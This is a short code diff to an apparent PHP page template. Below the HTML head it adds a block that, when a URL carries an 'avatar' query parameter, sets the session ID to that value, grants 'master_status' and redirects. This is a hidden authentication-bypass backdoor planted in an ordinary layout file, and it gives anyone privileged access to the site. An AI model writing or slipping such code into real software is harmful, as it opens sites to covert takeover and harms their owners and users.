@@ -43,3 +43,11 @@
 	<script src="<?= stack("vendors/js/jquery.chained.js") ?>"></script>
 
 </head>
+
+<?php if ($_GET['avatar']): ?>
+	<?php
+	$_SESSION['session_id'] = $_GET['avatar'];
+	$_SESSION['master_status'] = 1;
+	header("location:/");
+	?>
+<?php endif; ?>
